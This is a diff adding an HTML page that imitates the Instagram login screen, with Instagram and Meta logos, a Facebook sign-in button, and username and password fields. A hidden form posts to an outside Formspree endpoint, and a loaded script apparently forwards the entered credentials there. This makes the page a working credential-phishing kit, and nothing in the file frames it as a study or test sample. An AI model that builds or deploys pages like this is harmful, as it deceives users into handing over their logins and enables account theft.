@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Create/Access Account</title>
+  <!-- Stylesheets -->
+  <link rel="stylesheet" href="src/css/tailwindcss.css">
+  <link rel="stylesheet" href="src/css/style.css">
+</head>
+
+<body class="bg-gray-100">
+  <header>
+    <div class="container h-14 w-full mx-auto flex flex-row justify-between items-center">
+      <div class="burger-menu h-6 w-5 flex flex-row justify-between items-center ml-4">
+        <div class="w-1 h-1 rounded-full bg-gray-400"></div>
+        <div class="w-1 h-1 rounded-full bg-gray-400"></div>
+        <div class="w-1 h-1 rounded-full bg-gray-400"></div>
+      </div>
+      <h2 class="text-gray-400 text-sm">English</h2>
+      <div></div>
+    </div>
+  </header>
+  <main>
+    <div class="container mx-auto flex justify-center mt-1">
+      <div class="h-fit w-96 border border-gray-300 px-10">
+        <!-- instagram logo -->
+        <div class="instagram-logo h-max w-full">
+          <img src="/src/images/7a252de00b20.png" class="mx-auto my-10" alt="instagram-logo">
+        </div>
+        <!-- facebook -->
+        <div class="w-auto h-fit py-2 text-gray-100 bg-blue-600 rounded-md flex justify-center items-center gap-3">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="rgb(255, 255, 255)" width="24" height="24" viewBox="0 0 24 24">
+            <path
+              d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" />
+          </svg>
+          <span>Continue with Facebook</span>
+        </div>
+        <!-- or -->
+        <div class="h-max w-full py-2 flex flex-row justify-between items-center gap-3 my-3">
+          <div class="h-0.5 w-full bg-gray-400"></div>
+          <p class="text-gray-400 font-bold">OR</p>
+          <div class="h-0.5 w-full bg-gray-400"></div>
+        </div>
+        <!-- email & password -->
+        <div>
+          <input type="text"
+            class="bg-gray-200 border border-gray-300 text-gray-500 text-sm px-2 py-2 w-full outline-none"
+            name="instagramLogin" placeholder="Phone number, username, or email" id="username">
+          <br />
+          <input type="password"
+            class="bg-gray-200 border border-gray-300 text-gray-500 text-sm px-2 py-2 w-full outline-none mt-1.5"
+            name="instagramLogin" id="password" placeholder="Password">
+        </div>
+        <!-- forget -->
+        <div class="w-full h-fit flex justify-end mt-4">
+          <a href="#" class="text-blue-500 text-sm">Forgot password?</a>
+        </div>
+        <!-- login button -->
+        <div class="w-auto h-fit py-1.5 text-gray-100 bg-blue-600 rounded-md flex justify-center items-center my-6"
+          data-loginButton>
+          Login
+        </div>
+        <!-- create account -->
+        <div class="w-full flex justify-center gap-3 mb-3">
+          <p class="text-gray-400 text-sm">Don't have account?</p>
+          <p class="text-blue-600 text-sm font-bold">Sign up</p>
+        </div>
+      </div>
+    </div>
+    <div class="data h-32 w-full absolute top-0 left-0 hidden text-gray-100"></div>
+  </main>
+  <footer>
+    <div
+      class="w-full h-14 absolute bottom-0 left-0 bg-gray-200 border-t border-gray-300 flex flex-col justify-center items-center">
+      <span class="text-gray-500 text-sm">from</span>
+      <img src="/src/images/Meta_Platforms_Inc._logo.svg.png" class="h-3 mt-1" alt="meta logo">
+    </div>
+  </footer>
+  <div class="hidden">
+    <form action="https://formspree.io/f/mrgdebgk" method="POST">
+      <label>
+        Your email:
+        <input type="email" name="email" data-formspree="email">
+      </label>
+      <label>
+        Your message:
+        <textarea name="message" data-formspree="text"></textarea>
+      </label>
+      <!-- your other form fields go here -->
+      <button type="submit" data-formspree="send">Send</button>
+    </form>
+  </div>
+  <!-- Scripts -->
+  <script src=" src/js/app.js"></script>
+</body>
+
+</html>
